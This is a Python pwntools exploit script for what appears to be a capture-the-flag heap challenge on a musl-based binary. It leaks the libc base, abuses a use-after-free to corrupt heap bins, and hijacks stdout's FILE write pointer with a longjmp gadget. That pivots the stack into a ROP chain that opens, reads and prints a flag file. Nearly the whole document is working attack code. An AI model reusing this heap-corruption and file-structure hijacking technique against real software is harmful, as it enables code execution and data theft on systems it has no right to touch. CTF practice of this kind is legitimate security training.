from pwn import*
context(os = 'linux', arch = 'amd64', log_level = 'debug')

s = process('./pwn')
libc = ELF('./libc.so')

def add(content):
	s.sendlineafter(b'>>', b'1')
	s.sendafter(b'Please input the content\n', content)

def delete(index):
	s.sendlineafter(b'>>', b'2')
	s.sendlineafter(b'idx:\n', str(index))

def show(index):
	s.sendlineafter(b'>>', b'3')
	s.sendlineafter(b'idx\n', str(index))

def edit(index,content):
	s.sendlineafter(b'>>', b'4')
	s.sendlineafter(b'idx:\n', str(index))
	s.sendafter(b'Content\n', content)

add(b'a'*0x8) # 0
add(b'b'*0x8) # 1
show(0)
libc_base = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x292e50
success('[+] libc_base=> '+hex(libc_base))

mal = libc_base + 0x292ac0
stdout = libc_base + 0x292300
open_addr = libc_base + 0x23399
read_addr = libc_base + 0x59f8e
write_addr = libc_base + 0x5a3b5
bin16_head_addr = mal + 8 + 0x18*16 + 8
chunk0 = libc_base + 0x2953b0
gadget = libc_base + 0x000000000004951A

'''
.text:0000000000049503 loc_49503:
.text:0000000000049503 mov     rbx, [rdi]
.text:0000000000049506 mov     rbp, [rdi+8]
.text:000000000004950A mov     r12, [rdi+10h]
.text:000000000004950E mov     r13, [rdi+18h]
.text:0000000000049512 mov     r14, [rdi+20h]
.text:0000000000049516 mov     r15, [rdi+28h]
.text:000000000004951A mov     rdx, [rdi+30h]
.text:000000000004951E mov     rsp, rdx
.text:0000000000049521 mov     rdx, [rdi+38h]
.text:0000000000049525 jmp     rdx
.text:0000000000049525 longjmp endp
'''

pop_rdi_ret = libc_base + 0x0000000000014862
pop_rsi_ret = libc_base + 0x000000000001c237
pop_rdx_ret = libc_base + 0x000000000001bea2
ret = libc_base + 0x0000000000000cdc

delete(0)
edit(0, p64(stdout - 0x10)*2)
add(b'c'*0x8) # 2

delete(0)
edit(0, p64(bin16_head_addr - 0x18) + p64(stdout - 0x10))

payload = b'./flag\x00\x00'
payload+= p64(pop_rdi_ret) + p64(chunk0 + 0x10) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open_addr)
payload+= p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(chunk0 + 0x100) + p64(pop_rdx_ret) + p64(0x20) + p64(read_addr)
payload+= p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(chunk0 + 0x100) + p64(pop_rdx_ret) + p64(0x20) + p64(write_addr)

add(payload) # 3

'''
struct _IO_FILE {
    unsigned int flags;
    unsigned char *rpos;
    unsigned char *rend;
    int (*close)(FILE *);
    unsigned char *wend;
    unsigned char *wpos;
    unsigned char *mustbezero_1;
    unsigned char *wbase;
    size_t (*read)(FILE *, unsigned char *, size_t);
    size_t (*write)(FILE *, const unsigned char *, size_t);
    off_t (*seek)(FILE *, off_t, int);
    unsigned char *buf;
    size_t buf_size;
    FILE *prev;
    FILE *next;
    int fd;
    int pipe_pid;
    long lockcount;
    int mode;
    volatile int lock;
    int lbf;
    void *cookie;
    off_t off;
    char *getln_buf;
    void *mustbezero_2;
    unsigned char *shend;
    off_t shlim;
    off_t shcnt;
    FILE *prev_locked;
    FILE *next_locked;
    __locale_struct *locale;
} * const
'''

payload = b'a'*0x30
payload+= p64(stdout + 0x50) + p64(ret) + b'\x00'*0x8
payload+= p64(gadget) # _IO_FILE->write
payload+= p64(pop_rdi_ret) + p64(stdout + 0x38) + p64(gadget)
payload+= p64(chunk0 + 0x18) + p64(ret)

add(payload) # 4 orw
#gdb.attach(s)
s.interactive()
